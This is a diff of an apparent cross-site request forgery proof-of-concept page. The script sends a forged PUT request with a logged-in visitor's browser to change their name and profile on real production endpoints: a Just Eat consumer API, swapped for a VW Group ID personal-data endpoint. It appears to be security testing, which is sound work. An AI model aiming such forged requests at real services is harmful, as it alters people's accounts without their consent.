@@ -11,17 +11,17 @@
     <script>
       //history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
       //document.getElementById('csrfPoC').submit();
-      let bearerToken = "";
+      //let bearerToken = 
       const requestOptions = {
-      method: 'PATCH', // Or 'POST', 'PUT', 'DELETE', etc.
-      headers: {
-        //'Authorization': `Bearer ${bearerToken}`,
-        'Content-Type': 'application/json' // Often required for POST/PUT requests
-      },
-      body: JSON.stringify({"Name":"Asjad"}) // Convert JavaScript object to JSON string
-    };
+        method: 'PUT', // Or 'POST', 'PUT', 'DELETE', etc.
+        headers: {
+          //'Authorization': `Bearer ${bearerToken}`,
+          'Content-Type': 'application/json' // Often required for POST/PUT requests
+        },
+        body: JSON.stringify({"dateOfBirth":null,"placeOfBirth":null,"nationalityCode":null,"firstName":"Asjaddd","middleName":null,"lastName":"Butt","nickname":null,"salutation":"SALUTATION:MR","addresses":[],"phoneNumbers":[],"nationalIdentifiers":[],"preferredLanguages":[],"academicTitle":"ACADEMIC_TITLE_SIMPLIFIED:DR"}) // Convert JavaScript object to JSON string
+      };
 
-    fetch("https://rest.api.eu-central-1.production.jet-external.com/applications/international/consumer/me", requestOptions)
+    fetch("https://vwid.vwgroup.io/profile/put/personalData", requestOptions)
       .then(response => {
         if (!response.ok) {
           throw new Error(`HTTP error! status: ${response.status}`);
